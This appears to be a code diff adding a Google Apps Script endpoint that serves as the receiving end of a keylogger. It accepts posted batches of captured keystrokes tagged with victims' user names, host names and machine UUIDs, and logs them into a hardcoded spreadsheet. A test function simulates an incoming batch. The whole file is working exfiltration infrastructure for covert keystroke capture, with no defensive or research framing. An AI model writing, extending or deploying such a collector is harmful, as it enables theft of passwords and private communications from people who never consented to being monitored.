@@ -1,0 +1,85 @@
+function doPost(e) {
+  try {
+    // Log that function was called
+    console.log("doPost called");
+    
+    // Check for POST data
+    if (!e || !e.postData) {
+      console.log("No POST data");
+      return ContentService.createTextOutput("No data received");
+    }
+    
+    // Get the data
+    var jsonData = e.postData.getDataAsString();
+    console.log("Received data: " + jsonData);
+    
+    // Parse JSON
+    var data = JSON.parse(jsonData);
+    console.log("Parsed successfully");
+    
+    // Open spreadsheet - REPLACE WITH YOUR SHEET ID
+    var sheetId = "1guq51Xe7fMa1hPEVwITzBp2EjBz0SKvXIqr8bcjHmKk";
+    var ss = SpreadsheetApp.openById(sheetId);
+    var sheet = ss.getSheetByName("Sheet1");
+    
+    // Create sheet if it doesn't exist
+    if (!sheet) {
+      sheet = ss.insertSheet("Sheet1");
+      sheet.appendRow(["Timestamp", "Keystroke", "User", "Host", "UUID"]);
+    }
+    
+    // Process each keystroke
+    var words = data.words || [];
+    console.log("Processing " + words.length + " items");
+    
+    for (var i = 0; i < words.length; i++) {
+      var item = words[i];
+      sheet.appendRow([
+        item.timestamp || new Date().toString(),
+        item.word || "unknown",
+        data.user || "unknown",
+        data.host || "unknown", 
+        data.machine_uuid || "unknown"
+      ]);
+    }
+    
+    console.log("Data written to sheet");
+    
+    return ContentService.createTextOutput(JSON.stringify({
+      status: "success",
+      processed: words.length
+    })).setMimeType(ContentService.MimeType.JSON);
+    
+  } catch (error) {
+    console.log("Error: " + error.toString());
+    return ContentService.createTextOutput(JSON.stringify({
+      status: "error",
+      message: error.toString()
+    })).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+// Test function
+function testFunction() {
+  var testData = {
+    postData: {
+      getDataAsString: function() {
+        return JSON.stringify({
+          words: [
+            {word: "h", timestamp: "2025-01-15 10:00:00"},
+            {word: "e", timestamp: "2025-01-15 10:00:01"},
+            {word: "l", timestamp: "2025-01-15 10:00:02"},
+            {word: "l", timestamp: "2025-01-15 10:00:03"},
+            {word: "o", timestamp: "2025-01-15 10:00:04"}
+          ],
+          user: "testuser",
+          host: "testhost",
+          machine_uuid: "test123"
+        });
+      }
+    }
+  };
+  
+  var result = doPost(testData);
+  console.log("Test result: " + result.getContent());
+}
